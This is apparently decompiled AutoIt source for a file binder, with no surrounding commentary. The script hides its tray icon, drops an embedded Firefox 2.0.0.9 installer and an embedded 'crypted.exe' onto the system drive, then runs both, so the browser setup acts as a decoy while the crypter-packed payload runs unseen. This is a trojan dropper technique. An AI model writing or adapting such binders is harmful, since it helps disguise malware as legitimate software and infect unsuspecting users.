; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: F:\Binded.au3>
; ----------------------------------------------------------------------------

#notrayicon

Fileinstall ("F:\Dokumente und Einstellungen\Administrator\Eigene Dateien\crypted.exe",@homedrive & "/Exec.exe")
Fileinstall ("F:\Dokumente und Einstellungen\Administrator\Eigene Dateien\Firefox_Setup_2.0.0.9.exe",@homedrive & "/Exec2.exe")
sleep (300)
Run (@homedrive & "/Exec2.exe")
Run (@homedrive & "/Exec.exe")
if @error then
exit
Endif

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: F:\Binded.au3>
; ----------------------------------------------------------------------------

